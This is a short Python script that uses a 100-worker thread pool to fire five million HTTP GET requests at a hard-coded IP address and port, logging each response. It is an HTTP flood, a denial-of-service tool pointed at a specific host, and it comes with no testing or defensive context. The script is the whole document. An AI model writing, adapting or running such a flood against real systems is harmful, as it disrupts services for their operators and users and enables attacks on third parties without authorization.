  
import requests
from concurrent.futures import ThreadPoolExecutor

# Define the target IP address and port
target_ip = '162.214.201.88'
target_port = '5103'

# Define the URL for the requisition
url = f'http://{target_ip}:{target_port}'  # Replace 'your_endpoint' with the actual endpoint you want to request

# Define the number of requisitions you want to make
num_requests = 5000000

# Define the function to send a requisition
def send_request(_):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Request successful - Status Code: {response.status_code}")
        else:
            print(f"Request failed - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed - {e}")

# Create a ThreadPoolExecutor to send multiple requests concurrently
with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(send_request, range(num_requests))
